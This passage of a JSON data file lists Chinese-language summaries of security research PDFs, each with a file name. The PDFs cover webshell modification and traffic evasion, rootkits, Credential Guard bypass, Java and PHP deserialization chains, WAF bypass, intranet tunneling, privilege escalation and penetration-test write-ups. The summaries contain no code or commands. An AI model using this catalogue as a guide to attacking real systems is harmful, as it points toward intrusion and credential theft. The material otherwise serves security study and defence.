        "page_content": "该文档介绍了对冰蝎 4 的魔改，包括添加漏洞利用、编译加密文件、增加 websocket 接口、专属内存马和刷新马接口等功能。此外，还介绍了魔改的动机、实现原理和具体功能，并提供了下载链接。",
        "FileName": "12896-冰蝎4的魔改.pdf"
    },
    {
        "page_content": "本文探讨了 Windows 平台上 Rootkit 的高隐匿性和高持久性，分析了其生存期、可达到的效果、可行性和现状。Rootkit 是一种技术，可让攻击者隐藏恶意活动，使其难以被检测到，并延长其在受感染系统中的生存时间。尽管 Windows 引入了安全机制来对抗 Rootkit，但攻击者仍可以通过购买证书、滥用泄露证书或利用 0day 驱动来绕过这些机制。Rootkit 越来越多地被用于针对高价值目标的攻击中，包括政府和军事组织，其目的是长期监控和窃取重要情报。",
        "FileName": "10855-【Rootkit 系列研究】Windows平台的高隐匿、高持久化威胁.pdf"
    },
    {
        "page_content": "该文档探讨了如何绕过 Windows Defender Credential Guard 安全机制，该机制旨在保护凭据免遭盗窃。通过创建自定义安全支持提供程序 (SSP/AP) 并将其注册到系统，攻击者可以在用户重新进行交互式身份验证时提取明文凭据。该方法需要重新启动目标系统或使用 AddSecurityPackage API 在不重新启动的情况下加载 SSP/AP。",
        "FileName": "12104-Credential Guard Bypass From Custom SSP.pdf"
    },
    {
        "page_content": "该文档分析了 Click1 反序列化链，该链利用了 Click-nodeps-2.3.0.jar 和 javax.servlet-api-3.1.0.jar 中的漏洞，通过设置 TemplatesImpl 的 _bytecodes、_name 和 _tfactory 属性，并利用 PriorityQueue 的 Comparator 机制，最终调用 TemplatesImpl.getOutputProperties() 方法执行任意类。",
        "FileName": "9563-新的反序列化链——Click1.pdf"
    },
    {
        "page_content": "本文深入探讨了静态应用程序安全测试（SAST）中符号分析技术（SAST）的原理和应用，重点介绍了CodeQL在Java白盒能力建设中的实践。它解释了抽象语法树（AST）的概念，并展示了如何使用Spoon库分析Java源代码的AST。此外，本文还介绍了污点分析技术，并展示了如何使用CodeQL漏洞模型来定义和检测漏洞。最后，它提供了实际示例，展示了如何使用CodeQL查询Spring Web路径和检测不安全的Fastjson使用。",
        "FileName": "9429-58集团白盒代码审计系统建设实践2：深入理解SAST.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者通过模仿其他安全研究人员的成功方法，成功挖掘了一个低危教育信息泄露漏洞的经历。作者通过分析公开信息，识别弱口令，并利用现有的漏洞利用工具，最终获得了对目标网站后台的访问权限，并发现了学生信息泄露问题。",
        "FileName": "11504-第二次挖edusrc与人生的第一个edusrc.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Java 反射、RMI 和序列化机制，并提供了利用这些机制进行反序列化攻击的示例代码。文档还讨论了如何绕过安全限制，例如使用 AnnotationInvocationHandler 和 LazyMap，并提供了完整的反序列化链的示例代码。",
        "FileName": "11861-JAVA TransforMap&LazyMap链.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者在渗透测试中遇到的一个 ThinkPHP 5 站点，并分享了作者尝试使用各种方法获取 shell 的过程。作者首先尝试了常规的 session GETSHELL 和文件包含 GETSHELL 方法，但都失败了。随后，作者尝试了使用 ThinkPHP 框架中的内置方法 think\\Build::module 来创建新的模块，并通过注入 payload 来控制模块名，从而成功包含文件并获取 shell。最后，作者通过读取文件找到了日志存放路径，并通过文件包含日志成功拿下 shell。",
        "FileName": "8920-一次笨办法TP测试.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Gopher 协议进行服务器端请求伪造 (SSRF) 攻击，重点介绍了针对 Redis、MySQL、FastCGI 和 Memcached 等服务的攻击方法。它还提供了使用 Gopherus 工具生成有效负载的示例代码。",
        "FileName": "12374-gopher在ssrf中的应用.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Selenium 绕过前端 JavaScript 加密和验证码爆破，包括安装 Selenium、编写 Python 代码来模拟用户操作、使用 ddddocr 识别验证码、判断登录是否成功等步骤，并提供了多个示例代码。",
        "FileName": "11806-利用Selenium绕过前端js加密及验证码爆破.pdf"
    },
    {
        "page_content": "本文分析了 ThinkPHP3.2.3 框架中的 SQL 注入漏洞，该漏洞存在于前台登录处，攻击者可以通过构造恶意 payload 来绕过用户名和密码验证，实现任意进后台。文章详细介绍了漏洞的成因、利用方法以及对接 SQLMAP 的思路，为安全研究人员和渗透测试人员提供了有价值的参考信息。",
        "FileName": "8081-OneThink前台注入分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Python 语言开发一个自动化漏洞检测工具，该工具可以处理 HTTP 请求包，并通过修改请求参数值来检测 Web 漏洞，如 XSS、SQL 注入、SSRF 和命令执行。",
        "FileName": "9796-# web漏洞测试工具研发-https请求包处理.pdf"
    },
    {
        "page_content": "Potato 家族本地提权手法利用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限，通过一系列手段，使低权限服务账户直接获取 SYSTEM 权限。该手法利用了 Windows 权限模型中服务账户本身就拥有很高的权限，微软认为这不是一个漏洞。",
        "FileName": "7776-Potato家族本地提权细节.pdf"
    },
    {
        "page_content": "该文档分析了 MySQL JDBC 反序列化漏洞，该漏洞允许攻击者通过触发拦截器来执行反序列化，从而在目标系统上执行任意代码。触发反序列化需要满足以下条件：JDBC 连接 URL 可控、返回的结果集可控、触发反序列化的数据类型为 BLOB 且 autoDeserialize 设置为 true。文档还分析了 MySQL 私有协议，包括结果集数据包格式和字段类型，并提供了利用链和 POC 编写技巧。",
        "FileName": "9250-MySQL JDBC 反序列化分析.pdf"
    },
    {
        "page_content": "该文档详细描述了一次攻防演练，其中通过源码审计发现了 SQL 注入漏洞，并绕过 WAF，利用 SQL 注入插入管理员信息进入后台，最终通过后台执行语句功能利用日志备份获取 shell。",
        "FileName": "11921-记一次攻防演练.pdf"
    },
    {
        "page_content": "本文介绍了一道结合 Lua 的 pwn 题，该题涉及加密、解密、Lua 脚本处理输入逻辑等知识点。解题思路包括动态调试程序，分析解密后的 Lua 程序，生成随机数，暴力填充 flag 的 bss 地址等步骤。",
        "FileName": "9004-一道结合lua的pwn题--出题思路与解题过程.pdf"
    },
    {
        "page_content": "该文档主要讨论了 Apache、Nginx、IIS 中间件的漏洞，包括 PHP 解析模式、文件扩展名解析、.htaccess 文件配置、目录遍历、文件名解析、HTTP 头注⼊、目录穿越、IIS WebDAV 漏洞、短文件名猜测和后缀解析漏洞。文档提供了漏洞成因、影响版本、修复方法和利用技巧等信息，有助于理解和防御这些漏洞。",
        "FileName": "8631-apache nginx iis中间件漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了如何解密某项目前端 JavaScript 中加密的数据包。它详细描述了如何通过调试 JavaScript 代码来识别加密参数，包括 bizData、encryptKey、timestamp、signature 和 key。文档还提供了如何使用 AES 加密和 SHA256 签名解密数据包的步骤，并强调了偏移量和模式等关键概念。",
        "FileName": "10853-某项目前端js解密.pdf"
    },
    {
        "page_content": "本文档介绍了如何渗透不出网的内网目标，包括外网打点、信息收集、内网横向移动、SMB Beacon上线、MS17010漏洞利用等技术，并提供了详细的步骤和示例。",
        "FileName": "9372-内网渗透--对不出网目标的打法.pdf"
    },
    {
        "page_content": "这篇文档探讨了汽车网络安全，重点关注攻击面和潜在的攻击路径。它从云服务和移动终端的常规攻击路径开始，然后深入研究汽车内部网络组件，包括 TCU、ECU、IVI 和 OBD-II。文档还讨论了 CAN 总线、ECU、IVI、V2V 通信和无线电安全等特定攻击面，并提供了对汽车网络安全研究所需的技能树的见解。",
        "FileName": "9629-该如何打下一台智能汽车.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-9802 WebKit JIT 优化漏洞，该漏洞存在于 JSC 中对以下 JS 代码的优化中：let c = a + b; let d = a + b; 优化后，代码变为：let c = a + b; let d = c; 这种优化称为公共子表达式消除 (CSE)，但对于 let c = o.a; f(); let d = o.a; 这样的代码，无法进行优化消除，直接使 d=c，因为在调用 f() 函数的过程中可能会改变 o.a 的值。在 JSC 中，对某项操作是否进行 CSE 是在 DFGClobberize 中实现的。",
        "FileName": "8913-CVE-2020-9802-WebKit JIT优化漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 MeterSphere PluginController 中的一个远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过上传恶意 JAR 包并调用自定义方法来执行任意 Java 代码。漏洞存在于 add 和 customMethod 函数中，攻击者可以利用这些函数向内存中注册任意类并执行自定义方法。",
        "FileName": "10772-MeterSphere PluginController Pre-auth RCE.pdf"
    },
    {
        "page_content": "本文档主要介绍了对 stowaway 改造计划 2 的分析和改造过程。改造重点是实现代理工具通过 CDN 隐藏 IP，并通过 websocket 协议实现代理穿透 CDN。文档详细记录了改造过程中遇到的问题和解决方法，包括修改协议包、添加 websocket 支持、解决心跳包问题、实现多 startnode 以及新增非交互式 shell 指令。",
        "FileName": "10641-stowaway改造计划2.pdf"
    },
    {
        "page_content": "该文档记录了一次对某网站的渗透测试，测试者通过修改登录参数绕过了管理员身份验证，并发现了SSRF漏洞。随后，网站修复了漏洞，但测试者再次绕过了修复措施，最终通过空值绕过成功登录后台。",
        "FileName": "9184-记一次和厂家相爱相杀.pdf"
    },
    {
        "page_content": "该文档记录了使用 Jboss 反序列化漏洞进行内网渗透的步骤。攻击者利用 jexboss.py 脚本，通过向目标服务器发送恶意数据包，成功获取了 shell。随后，攻击者使用向日葵免安装版本连接远程桌面，并获取了目标机器的向日葵机器码，从而实现了对内网的渗透。",
        "FileName": "12120-记一次从jboss到内网渗透实战.pdf"
    },
    {
        "page_content": "本文分析了Tomcat下JNDI高版本绕过，主要通过寻找可以执行命令的函数、UrlClassLoader和已知存在漏洞的组件来实现绕过。",
        "FileName": "10829-Tomcat下JNDI高版本绕过浅析.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过云锁 Waf 的安全措施，通过使用时间盲注技术来查询数据库信息，包括数据库名和表名。作者尝试了多种方法，最终通过修改 select 语句并使用分块传输技术成功绕过了云锁。",
        "FileName": "7522-实战bypass云锁.pdf"
    },
    {
        "page_content": "elFinder 软件中的路径遍历漏洞（CVE-2022-26960）允许攻击者读取、写入和浏览配置文件根目录之外的文件，影响范围从任意文件读取到远程代码执行。该漏洞源于处理双斜线时出现问题，绕过了安全函数，导致攻击者能够通过构建以根路径为前缀并注入未过滤的 ../ 字符序列的路径来利用该漏洞。",
        "FileName": "12447-【exploit系列SYNACKTIV】Elfinder：Web端文件管理器的漏洞发现之旅.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何在各种场景下使用 BurpSuite 进行抓包，包括 Firefox、Chrome、微信小程序、APP 和 Fiddler。它提供了分步说明、屏幕截图和故障排除技巧，以帮助用户成功配置和使用 BurpSuite 进行网络流量分析。",
        "FileName": "9425-Burpsuite新手教程(一)Burpsuite在各场景下的抓包应用.pdf"
    },
    {
        "page_content": "该文档主要介绍了利用 MySQL 的 \"LOAD DATA LOCAL INFILE\" 特性读取 MySQL 客户端代码，从而在访问恶意 MySQL 服务器时读取管理员服务器上的任意源码。文档还提供了多种利用方法，包括使用 Python、Go 和 Python2 实现的恶意 MySQL 服务器，以及通过读取系统源码、数据库配置和开放服务来获取权限。",
        "FileName": "11225-一次adminer之旅.pdf"
    },
    {
        "page_content": "该文档探讨了 OAuth 登录安全测试中的两个漏洞：1）未对微博的 access_token 校验导致任意用户登录；2）微博 access_token 校验不严格导致交互后劫持账号。这些漏洞存在于许多应用程序中，攻击者可以通过修改请求参数或利用 implicit 模式来劫持用户帐户。文档建议使用 access_token 校验和获取 appkey 来验证 access_token 的真实性，以修复这些漏洞。",
        "FileName": "9179-手机应用中的OAuth登陆安全测试.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 FofaHub 工作流自动化仿冒网站拓线，以提高仿冒网站管理和预防的效率。该工作流通过输入钓鱼网站列表，自动扩展未知数据，检测和筛选，并输出扩展后的仿冒网站链接，从而简化了传统拓线方法的复杂性和耗时性。此外，该文档还介绍了数据仓库功能，用于存储和管理工作流运行结果，方便数据管理和分析。",
        "FileName": "12020-最佳实践：仿冒站点一键自动化拓线（修订版）.pdf"
    },
    {
        "page_content": "该文档分析了四个影响 WordPress 在线学习管理系统插件 LearnPress、LearnDash 和 LifterLMS 的安全漏洞，包括权限提升、SQL 注入和远程代码执行漏洞。这些漏洞允许攻击者获取敏感信息、编辑个人记录，甚至控制 LMS 平台。",
        "FileName": "7720-CVE-2020-6006009601011511：在线学习平台多安全漏洞.pdf"
    },
    {
        "page_content": "本文档详细记录了对某网站进行渗透测试的过程，包括信息收集、漏洞利用、提权和最终接管宝塔面板。渗透者利用了微盘程序的默认账号、CVE漏洞和宝塔面板的默认密码，成功获得了网站的控制权。",
        "FileName": "11138-对某站点的一次详尽渗透记录.pdf"
    },
    {
        "page_content": "该文档分析了 Java RMI 反序列化的攻击方式，包括攻击注册中心和攻击客户端，并提供了利用 JEP290 绕过安全机制的思路。",
        "FileName": "9053-Java安全之RMI反序列化.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 YApi 中的 RCE 漏洞来获取目标服务器的 shell 权限。攻击者通过扫描目标服务器的端口，发现了一个开放的 SSH 端口，并使用默认弱口令登录。随后，他们利用 YApi 中的 RCE 漏洞，通过调用一个会员接口并提供特定的参数，成功执行了命令，获得了服务器的 shell 权限。",
        "FileName": "12030-一次接口深入到rce分享.pdf"
    },
    {
        "page_content": "该文档描述了 CVE-2020-26935 漏洞，该漏洞存在于 phpMyAdmin 4.9.6 之前的版本和 5.x 5.0.3 之前的版本中。该漏洞允许攻击者通过 SQL 注入查询来利用 phpMyAdmin 的搜索功能。攻击者可以通过在请求中设置 `get_data_row` 参数并提供恶意 SQL 语句来利用此漏洞。",
        "FileName": "8524-CVE-2020-26935 phpmyadmin后台SQL注入.pdf"
    },
    {
        "page_content": "该文档分析了 Windows 系统中钩子技术的原理和应用场景，并详细介绍了 IAThook 和 Inlinehook 两种钩子技术，包括它们的实现过程和使用示例。",
        "FileName": "10351-初探hook技术.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试的复盘总结，详细描述了在目标系统上获取webshell、提权、内网渗透和解决遇到的各种问题的过程，包括绕过上传限制、利用漏洞提权、使用代理上线内网、解决3389访问问题、利用IIS6.0解析漏洞和SQL注入获取webshell等技术手段。",
        "FileName": "9258-某次演练复盘总结.pdf"
    },
    {
        "page_content": "**主题：** 通达 OA 任意文件删除和文件上传 RCE 分析\n\n**内容：** 该文档分析了通达 OA V11.6 中的两个漏洞，利用这些漏洞，攻击者可以通过任意文件删除漏洞删除包含身份验证文件的上传点，然后通过未授权访问任意文件上传漏洞上传任意文件，从而实现未授权访问和任意文件上传。",
        "FileName": "8430-通达OA任意文件删除&文件上传RCE分析(2020年hw 8月0day).pdf"
    },
    {
        "page_content": "本文档详细描述了一次通过敏感信息泄露引发的逻辑漏洞挖掘过程。通过分析泄露的文档，研究人员发现了账号命名规律和手机号码，从而爆破出大量弱口令账号。利用这些账号，研究人员在后台发现了越权打全站存储 XSS 漏洞和导出大量商户数据的功能。通过进一步分析，研究人员发现可以通过忘记密码功能重置全站用户密码，包括管理员密码。最终，研究人员利用这些漏洞形成了一个重置两个商户系统所有用户密码的攻击链，凸显了未授权下载文件带来的严重后果。",
        "FileName": "7745-一次敏感信息泄露引发的逻辑漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档分析了 Laravel 8.x 中的一个反序列化漏洞，该漏洞允许攻击者通过控制 `$extender` 和 `$object` 变量来执行任意代码。漏洞利用链涉及多个类和方法，包括 `Illuminate\\Testing\\PendingCommand`, `Illuminate\\Container\\Container` 和 `Illuminate\\Testing\\PendingCommand->run()`。攻击者可以通过设置 `Illuminate\\Container\\Container->aliases` 和 `Illuminate\\Container\\Container->extenders` 来控制这些变量，从而触发反序列化并执行恶意代码。",
        "FileName": "10640-最新Laravel(8.x)反序列化漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Suricata 和 ELK 进行流量检测，包括安装和配置 Suricata、安装和配置 ELK 组件、配置 Suricata.yaml 文件以及对接内部 ES 集群。",
        "FileName": "7263-使用Suricata和ELK进行流量检测.pdf"
    },
    {
        "page_content": "该文档介绍了 SPP 内网隧道工具，它支持多种协议和类型，可以自由组合内部和外部协议，满足各种内网极端环境下的隧道搭建需求。文档详细解释了 SPP 的命令用法，包括服务器和客户端的基本用法、正向代理、反向代理、socks5 代理等功能，并提供了实战场景应用示例，如使用 ICMP+反向 socks 代理进入目标内网。",
        "FileName": "9820-内网隧道工具SPP尝鲜.pdf"
    },
    {
        "page_content": "本文档主要介绍了Linux内核内存取证的流程，包括Volatility2和Volatility3中Profile的制作过程、符号表的生成和使用，以及LiME工具的使用。Volatility3不再使用Profile配置⽂件，而是使用扩展的符号表库Symbols，并且可以基于内存映像本身生成新的符号表。LiME是一个Linux可加载内核模块，允许从Linux或基于Linux的设备获取临时性内存。",
        "FileName": "11800-最近遇到的Linux内核内存取证小分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-11060 漏洞，该漏洞影响 GLPI 软件，允许攻击者通过滥用备份功能执行系统命令。文档详细介绍了漏洞的原理、利用方法和优化后的 POC，包括构造 GZIP 数据流尾部结构体伪造 CRC 值和构造不被压缩的块。",
        "FileName": "9144-CVE_2020_11060 EXP优化.pdf"
    },
    {
        "page_content": "**主题：** TP 渗透测试中的艰难突破\n\n**内容：** 该文档详细描述了对 ThinkPHP 5.0.23 网站进行渗透测试的艰难过程，包括尝试各种 payload、绕过禁用函数、利用 session 和 redis 来获取 shell，以及最终通过文件包含成功获取 shell。",
        "FileName": "8453-一次艰难的TP渗透测试.pdf"
    },
    {
        "page_content": "该文档介绍了如何固定某项目前端 JavaScript 解密中随机生成的密钥。它提供了三种方法：通过 Chrome 浏览器调试工具替换加载的 JS 文件、使用 BurpSuite 修改 JS 响应包，以及使用 ReRes 浏览器插件。通过固定密钥，可以简化解密过程，并提高安全性。",
        "FileName": "11017-某项目前端js解密【二】之随机秘钥如何固定.pdf"
    },
    {
        "page_content": "该文档介绍了 CVE-2020-4054 漏洞，该漏洞影响 Ruby Sanitize < 5.2.1，允许绕过安全过滤功能。该漏洞利用了 <style> 标签的特殊处理方式，该标签在反序列化时不会对 HTML 实体进行编码，以及 <svg> 和 <math> 标签在存在时会改变解析规则的特性。通过构造一个恶意的 DOM 树，攻击者可以注入恶意代码并触发 XSS 漏洞。",
        "FileName": "8226-CVE-2020-4054：Ruby Sanitize  5.2.1 可被绕过.pdf"
    },
    {
        "page_content": "Twig 是一个灵活、快速、安全的 PHP 模板语言，它将模板编译成经过优化的原始 PHP 代码。Twig 拥有一个 Sandbox 模型来检测不可信的模板代码，并允许开发人员定义自己的标签、过滤器和 DSL。",
        "FileName": "10056-Twig 模板注入从零到一.pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透测试人员如何利用各种漏洞和技术在 Linux 和 Windows 系统中逐步获取对目标网络的访问权限，包括利用 CVE-2018-12613 远程文件包含漏洞、使用 S2-046 漏洞远程执行命令、利用 Tomcat 漏洞上传 shell、使用 CrossC2 插件上线、利用特权模式逃逸 Docker 容器、利用永恒之蓝漏洞攻击 Windows 主机、使用 mimikatz 抓取密码、利用 ms14-068 漏洞注⼊票据并最终获取域控权限。",
        "FileName": "10329-记一次曲折上线linux的渗透.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用目录遍历漏洞和网站物理路径泄露来攻击公司 OA 服务器，包括信息收集、漏洞挖掘、权限提升等步骤，最终成功获取了服务器的 root 权限。",
        "FileName": "8919-看我如何拿下公司OA服务器.pdf"
    },
    {
        "page_content": "CVE-2016-0165 是一个典型的整数上溢漏洞，由于在 RGNMEMOBJ::vCreate 函数中分配内核池内存块前没有对计算的内存块大小参数进行溢出校验，导致函数有可能分配到远小于所期望大小的内存块。而函数本身并未对分配的内存块大小进行必要的校验，在后续通过该内存块作为缓冲区存储数据时，将会触发缓冲区溢出访问的 OOB 问题，严重情况将导致系统 BSOD 的发生。",
        "FileName": "9348-CVE-2016-0165 Win32k漏洞分析笔记.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-3156 漏洞的利用过程，该漏洞利用了 sudo 中的堆溢出漏洞，通过修改 sudoers.so 中的 service_user 结构体，加载恶意动态链接库，从而绕过 suid 文件的限制，获得 root 权限。",
        "FileName": "9192-cve-2021-3156的poc流程分析.pdf"
    },
    {
        "page_content": "该文档记录了一次网络渗透测试，测试者通过弱口令尝试、端口扫描、永恒之蓝漏洞利用和Mimikatz工具抓取管理员密码等手段，成功获取了目标网络中的多台Windows主机权限，但由于无法出网和获取其他主机权限，最终未能进一步深入渗透。",
        "FileName": "8425-半途而废的测试.pdf"
    },
    {
        "page_content": "文档主题是 Ethernaut 闯关录（上），内容介绍了 Ethernaut 平台的介绍、环境准备、关卡示例、合约分析、攻击流程等内容，详细讲解了 Hello Ethernaut、Become the owner、Fallback、Fallout、Coin Flip、Telephone、Token、Delegate、Force、Vault 等关卡的通关方法。",
        "FileName": "7173-Ethernaut闯关录（上）.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何渗透春秋云镜域靶场 Certify，涉及技术包括 Solr RCE、AD CS、SMB、Kerberos 和域渗透。通过利用这些技术，渗透者可以获得反弹 shell、提权、内网信息收集、Kerberoast 攻击、DCsync 攻击和横向域控制器移动，最终获得所有 4 个 flag。",
        "FileName": "12117-记一次春秋云镜域渗透靶场Certify.pdf"
    },
    {
        "page_content": "该文档分析了2021腾讯游戏安全技术初赛PC客户端解题报告，报告中通过使用IDA分析游戏程序，识别出使用GLFW库和OpenGL ES，并通过修改全局变量dword_464CC4、dword_464CC8和qword_464CAC来实现坐标移动，最终找到了flag:dogod。",
        "FileName": "9402-2021腾讯游戏安全技术初赛PC客户端解题报告.pdf"
    },
    {
        "page_content": "该文档分析了栈溢出进阶技术，具体来说，它讨论了在 64 位程序中如何通过利用 `__libc_csu_init` 中的 gadget 来传递三个参数，并提供了利用该技术的示例代码。",
        "FileName": "12177-栈溢出进阶.pdf"
    },
    {
        "page_content": "本文档分析了使用 CVE-2020-2555 攻击 Shiro 的过程，包括尝试使用 FileOutputStream、TemplatesImpl 和 JavaScript 脚本解析引擎实现任意代码执行，最终成功使用 ScriptEngineManager 回显内存 shell。",
        "FileName": "9343-使用 CVE-2020-2555 攻击 Shiro.pdf"
    },
    {
        "page_content": "该文档描述了对企业内部电子健康记录 (EHR) 系统进行渗透测试的步骤，重点关注在没有访问权限的情况下获取访问权限。渗透测试人员利用 JavaScript 代码分析、路径提取和参数构造技术，最终发现了多个漏洞，包括任意文件上传、越权访问和个人信息泄露。",
        "FileName": "11943-一次对企业内部EHR系统的渗透测试.pdf"
    },
    {
        "page_content": "该文档介绍了在获得 Webshell 后进行后渗透的技巧，包括使用长亭牧云主机管理助手进行权限维持、使用 suo5 代理稳定连接、使用 netspy 快速探测内网存活网段、收集密码以及进入政务电子网的方法。这些技巧可以帮助渗透测试人员在获得 Webshell 后进一步深入目标网络，进行更深入的渗透测试。",
        "FileName": "12631-关于拿到webshell后的一些后渗透技巧.pdf"
    },
    {
        "page_content": "本篇文档主要介绍了如何使用 CodeQL 数据流分析功能查找 Struts 框架中 CVE-2017-9805 漏洞的利用链，该漏洞是由用户控制的输入直接传递到 XStream.fromXML 方法导致的反序列化漏洞。文档详细介绍了如何使用 CodeQL 查询方法名称、类名、接口名、参数和参数类型，并通过数据流分析从源（toObject 方法的 in 参数）到汇（fromXML 方法的 argument）查找路径，从而识别潜在的利用链。",
        "FileName": "7789-codeql学习——污点分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用各种工具（如 reGeorge、Neo-reGeorg、frp、ew 和 NPS）在内网中建立隐蔽隧道，从而绕过安全策略限制并实现对目标服务器的控制。它提供了详细的步骤和配置说明，涵盖了正向和反向代理、TCP 隧道、HTTP 代理和 SOCKS 代理的建立。",
        "FileName": "10174-内网穿透隐秘隧道搭建.pdf"
    },
    {
        "page_content": "该文档提供了 XSSed 通关教程，详细介绍了如何利用各种漏洞构造有效载荷，包括普通 XSS、JavaScript XSS、过滤 XSS 和链式 XSS。它强调了输入过滤的重要性，并展示了如何利用伪协议来绕过过滤并执行 JavaScript 代码。",
        "FileName": "12100-XSSed通关教程.pdf"
    },
    {
        "page_content": "该文档分析了 Follina Microsoft Office 远程代码执行 (RCE) 漏洞，该漏洞利用 MS-MSDT 协议通过远程模板注入和 PowerShell 执行命令来绕过编辑限制。它详细介绍了漏洞的利用过程，包括使用 ms-msdt 伪协议、PCWDiagnostic 诊断包和 IT_BrowseForFile 参数。该文档还讨论了漏洞的防御和免杀技术。",
        "FileName": "11416-Follina Microsoft Office RCE with MS-MSDT Protocol.pdf"
    },
    {
        "page_content": "本文记录了一次实战渗透过程，从信息收集、漏洞利用到横向渗透，详细介绍了渗透过程中遇到的问题和解决方法，并分享了渗透工具和技巧，旨在帮助渗透新手入门。",
        "FileName": "7352-我遇到的实战渗透.pdf"
    },
    {
        "page_content": "本文档概述了 wtf 的起源、历史以及我从零开始实现初步目标的整个过程。对于那些想要在开发时测试 Windows 目标（无论是用户还是内核模式）的人来说，wtf 是一个不错的选择。",
        "FileName": "12683-【译】构造新的快照 fuzzer&fuzzing IDA.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 PDF 中的 XSS 漏洞来读取服务器内部文件，包括 hosts、passwd 和 id_rsa，从而获得主机权限。该漏洞可以通过在可控输入中注入 HTML 标记和 JavaScript 代码来触发，并使用 file 协议读取文件。该漏洞的危害在于它可以与其他漏洞相结合，例如本地文件包含或 SSRF，以实现漏洞利用的最大化。",
        "FileName": "10025-XSS漏洞_从PDF中获取数据.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用华为路由器历史漏洞在 QEMU 仿真环境中复现任意代码执行漏洞。它涉及提取固件文件系统、配置 QEMU 环境、启动仿真机、解压固件、挂载文件系统、通过 SSH 连接仿真机、启动路由器、设置 IP 地址、下载低版本 Firefox 浏览器、利用格式化字符串漏洞执行任意代码，最终成功在路由器上创建了一个名为 \"hell\" 的二进制文件。",
        "FileName": "12761-华为路由器-历史漏洞复现.pdf"
    },
    {
        "page_content": "**主题：**冰蝎流量免杀初探\n\n**内容：**本文介绍了如何对冰蝎流量进行改造以实现免杀，包括本地和远程加密解密过程的详细分析，以及如何生成自己的webshell并使用Burp抓包查看流量。",
        "FileName": "11942-冰蝎流量免杀初探.pdf"
    },
    {
        "page_content": "本文探讨了渗透测试中无回显漏洞的分析和利用，重点介绍了 SQL 注入、XSS、SSRF、XXE 和命令执行等漏洞的无回显情况下的检测和利用方法，包括 DNSlog、延时盲注、Load_file() 函数、XSS 盲打、Python HTTP 服务和外带数据等技术。",
        "FileName": "9916-PHP无回显渗透测试总结.pdf"
    },
    {
        "page_content": "该文档记录了一次网络渗透测试，攻击者通过弱口令登录某网站，获取系统权限后，使用代理工具和命令行工具在内网中横向移动，发现并利用了 MS17-010 漏洞，最终获得了对多台内网机器的控制权，并对内网进行了进一步的扫描和探索。",
        "FileName": "9694-某站点的测试.pdf"
    },
    {
        "page_content": "Oracle 数据库注⼊绕过技术总结了绕过安全措施的各种方法，包括空格替换、大小写替换、拼接换行回车符、替换注⼊方法、分块传输和万能脏数据，这些方法可以帮助渗透测试人员绕过 WAF 和代码层面的过滤，成功利用漏洞。",
        "FileName": "10469-Oracle 注入bypass总结.pdf"
    },
    {
        "page_content": "本文探讨了如何挖掘 PHP 反序列化链，重点关注寻找起点、跳板和终点，并提供了 Yii2 框架中两个 RCE 反序列化链的实战演练，强调了变量可控和攻击面扩大的重要性。",
        "FileName": "8082-怎样挖掘出属于自己的php反序列化链.pdf"
    },
    {
        "page_content": "这篇文档总结了攻防演练中攻击者打开缺口的常见方法，包括弱口令、数据库弱口令、文件上传、反序列化漏洞、信息泄露等，并提供了相应的工具和技巧，强调了在攻防演练中快速识别和利用漏洞的重要性。",
        "FileName": "10400-攻防演练中攻击方的思考.pdf"
    },
    {
        "page_content": "通达 OA 11.10 版本中存在反序列化漏洞，该漏洞利用了 yii 框架中 csrf token 的反序列化触发点，攻击者可以通过伪造 csrf token 并发送恶意请求来执行任意 PHP 代码。",
        "FileName": "12855-通达OA 12.4 反序列化漏洞分析.pdf"
    },
    {
        "page_content": "本文档记录了一次对“⻥跃 cms”的粗糙审计，作者使用了一系列工具，包括 phpstorm、phpstudy、burpsuite 和自动化审计工具。审计发现了三个漏洞：后台插件上传导致任意文件上传、后台主题上传导致任意文件上传和后台任意目录删除。作者还尝试了遍历目录爆破未授权的方法，但没有收获。",
        "FileName": "10592-记一次粗糙的cms审计.pdf"
    },
    {
        "page_content": "该文档分析了 36c3 Web 比赛中的签到题，该题涉及一个简单的文件托管解决方案，其中文件类型由 finfo 确定，并使用 sqlite 存储文件上传记录。由于创建的数据库将 id 指定为自增整数主键，并且它使用 lastInsertId() 返回最后插入数据的 id 作为文件名，因此基本上可以不考虑通过可控文件名上传文件来获取 shell。通过 fuzzing 各种特殊文件，发现了一个文件类型为 compress'd data 的文件，其中包含可控数据。然后，通过修改 exiftool 来修改图像，并利用 gunzip 生成的 gz 文件，可以注入 payload。此外，还可以利用 #!/ 文件和 ynetd 来启动 admin.py，从而点赞和提交给管理员。",
        "FileName": "7081-36c3 Web 学习记录.pdf"
    },
    {
        "page_content": "该文档重点关注智能汽车时代的数据安全和应用程序安全问题。它概述了针对蔚来、沃尔沃、特斯拉和大众等汽车制造商的网络攻击事件，强调了汽车互联带来的安全风险。文档还讨论了软件供应链攻击和软件漏洞对智能汽车发展的威胁，并提出了使用软件成分分析 (SCA) 和运行时应用程序自我保护 (RASP) 等措施来保障应用程序安全的解决方案。",
        "FileName": "12448-蔚来汽车大量数据泄露，谁来保护智能汽车时代的应用安全？.pdf"
    },
    {
